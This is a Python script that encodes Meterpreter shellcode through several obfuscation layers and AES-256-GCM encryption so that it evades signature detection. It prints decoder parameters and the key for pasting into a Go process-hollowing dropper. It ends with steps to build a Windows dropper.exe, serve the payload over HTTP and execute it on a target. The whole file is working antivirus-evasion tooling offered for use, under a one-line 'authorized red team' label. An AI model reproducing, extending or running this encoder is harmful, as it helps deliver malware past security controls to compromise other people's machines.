#!/usr/bin/env python3
"""
Custom Shellcode Encoder - Multi-layer obfuscation for Meterpreter
Bypasses signature detection with polymorphic encoding
FOR AUTHORIZED RED TEAM EXERCISES ONLY
"""

import sys
import random
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def xor_encode(data, key):
    """Simple XOR encoding with key"""
    return bytes([b ^ key for b in data])

def rol_encode(data, bits=3):
    """Rotate left encoding"""
    result = bytearray()
    for byte in data:
        rotated = ((byte << bits) | (byte >> (8 - bits))) & 0xFF
        result.append(rotated)
    return bytes(result)

def add_encode(data, key):
    """Addition encoding"""
    return bytes([(b + key) & 0xFF for b in data])

def sub_encode(data, key):
    """Subtraction encoding"""
    return bytes([(b - key) & 0xFF for b in data])

def swap_bytes(data):
    """Swap adjacent bytes"""
    result = bytearray(data)
    for i in range(0, len(result) - 1, 2):
        result[i], result[i + 1] = result[i + 1], result[i]
    return bytes(result)

def insert_junk(data, junk_ratio=0.1):
    """Insert random junk bytes that will be skipped"""
    result = bytearray()
    data_with_markers = bytearray()

    # Add marker byte before each real byte
    for byte in data:
        data_with_markers.append(0xAA)  # Marker
        data_with_markers.append(byte)

    return bytes(data_with_markers)

def polymorphic_encode(shellcode, seed=None):
    """
    Multi-layer polymorphic encoding
    Each execution produces different encoded output
    """
    if seed is None:
        seed = random.randint(0, 0xFFFFFFFF)

    random.seed(seed)

    # Layer 1: Random XOR key
    xor_key1 = random.randint(1, 255)
    encoded = xor_encode(shellcode, xor_key1)
    print(f"[+] Layer 1: XOR with key 0x{xor_key1:02x}")

    # Layer 2: ROL (rotate left)
    rol_bits = random.randint(1, 7)
    encoded = rol_encode(encoded, rol_bits)
    print(f"[+] Layer 2: ROL {rol_bits} bits")

    # Layer 3: ADD encoding
    add_key = random.randint(1, 255)
    encoded = add_encode(encoded, add_key)
    print(f"[+] Layer 3: ADD 0x{add_key:02x}")

    # Layer 4: Byte swapping
    if len(encoded) % 2 == 1:
        encoded = encoded + b'\x00'  # Pad if odd length
    encoded = swap_bytes(encoded)
    print(f"[+] Layer 4: Byte swap")

    # Layer 5: Another XOR with different key
    xor_key2 = random.randint(1, 255)
    encoded = xor_encode(encoded, xor_key2)
    print(f"[+] Layer 5: XOR with key 0x{xor_key2:02x}")

    # Layer 6: Insert junk bytes
    encoded = insert_junk(encoded)
    print(f"[+] Layer 6: Junk insertion (0xAA markers)")

    # Store encoding parameters
    params = {
        'seed': seed,
        'xor_key1': xor_key1,
        'rol_bits': rol_bits,
        'add_key': add_key,
        'xor_key2': xor_key2,
        'original_length': len(shellcode),
        'encoded_length': len(encoded)
    }

    return encoded, params

def aes_encrypt(plaintext, key):
    """AES-256-GCM encryption (Go compatible)"""
    cipher = AES.new(key, AES.MODE_GCM, nonce=get_random_bytes(12))
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    return cipher.nonce + ciphertext + tag

def generate_decoder_params(params):
    """Generate Go code with decoder parameters"""
    code = f"""
// Decoder parameters (generated by encode_shellcode.py)
const (
    DECODER_SEED     = {params['seed']}
    XOR_KEY1         = 0x{params['xor_key1']:02x}
    ROL_BITS         = {params['rol_bits']}
    ADD_KEY          = 0x{params['add_key']:02x}
    XOR_KEY2         = 0x{params['xor_key2']:02x}
    ORIGINAL_LENGTH  = {params['original_length']}
    ENCODED_LENGTH   = {params['encoded_length']}
)
"""
    return code

def main():
    print("=" * 70)
    print("  Custom Shellcode Encoder - Polymorphic Multi-layer")
    print("  FOR AUTHORIZED RED TEAM EXERCISES ONLY")
    print("=" * 70)
    print()

    if len(sys.argv) < 3:
        print("Usage:")
        print(f"  {sys.argv[0]} <input_shellcode> <output_encoded> [aes_key_hex] [seed]")
        print()
        print("Examples:")
        print(f"  {sys.argv[0]} payload.raw payload.enc")
        print(f"  {sys.argv[0]} payload.raw payload.enc a02106e83c2ff25ec9d45151a0f1855cda8eb331cb301916102df6bf864c1c11")
        print(f"  {sys.argv[0]} payload.raw payload.enc a02106...11 12345")
        print()
        sys.exit(1)

    input_file = sys.argv[1]
    output_file = sys.argv[2]

    # AES key
    if len(sys.argv) > 3:
        key_hex = sys.argv[3]
        if key_hex.startswith('0x'):
            key_hex = key_hex[2:]
        if len(key_hex) != 64:
            print(f"[-] Error: AES-256 key must be 64 hex characters")
            sys.exit(1)
        aes_key = bytes.fromhex(key_hex)
        print(f"[+] Using provided AES-256 key")
    else:
        aes_key = get_random_bytes(32)
        key_hex = aes_key.hex()
        print(f"[+] Generated random AES-256 key:")
        print(f"    {key_hex}")
        print()

    # Seed for polymorphic encoding
    if len(sys.argv) > 4:
        seed = int(sys.argv[4])
        print(f"[+] Using seed: {seed}")
    else:
        seed = random.randint(0, 0xFFFFFFFF)
        print(f"[+] Generated random seed: {seed}")

    print()

    # Read shellcode
    print(f"[*] Reading shellcode from: {input_file}")
    try:
        with open(input_file, 'rb') as f:
            shellcode = f.read()
    except FileNotFoundError:
        print(f"[-] File not found: {input_file}")
        sys.exit(1)

    print(f"[+] Read {len(shellcode)} bytes")
    print(f"[+] First 8 bytes: {shellcode[:8].hex()}")
    print()

    # Polymorphic encoding
    print("[*] Applying polymorphic encoding...")
    encoded, params = polymorphic_encode(shellcode, seed)

    print()
    print(f"[+] Encoded size: {len(encoded)} bytes")
    print(f"[+] Size increase: {len(encoded) - len(shellcode)} bytes")
    print(f"[+] Ratio: {len(encoded) / len(shellcode):.2f}x")
    print()

    # AES encryption
    print("[*] Applying AES-256-GCM encryption...")
    encrypted = aes_encrypt(encoded, aes_key)

    print(f"[+] Final encrypted size: {len(encrypted)} bytes")
    print()

    # Save encrypted payload
    with open(output_file, 'wb') as f:
        f.write(encrypted)
    print(f"[+] Encrypted payload saved to: {output_file}")
    print()

    # Save decoder parameters
    decoder_file = output_file.replace('.enc', '_decoder.txt')
    with open(decoder_file, 'w') as f:
        f.write(generate_decoder_params(params))
    print(f"[+] Decoder parameters saved to: {decoder_file}")
    print()

    print("=" * 70)
    print("DECODER PARAMETERS - Copy to your dropper:")
    print("=" * 70)
    print(generate_decoder_params(params))

    print("=" * 70)
    print("AES KEY - Copy to your dropper:")
    print("=" * 70)
    print(f'const AES_KEY = "{key_hex}"')
    print()

    print("=" * 70)
    print("NEXT STEPS:")
    print("=" * 70)
    print()
    print("1. Copy decoder parameters to hollower-dropper-custom.go")
    print("2. Copy AES key to hollower-dropper-custom.go")
    print("3. Build dropper:")
    print("   GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -o dropper.exe hollower-dropper-custom.go")
    print()
    print("4. Start web server:")
    print("   python3 -m http.server 8000")
    print()
    print("5. Execute on target")
    print()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Cancelled")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
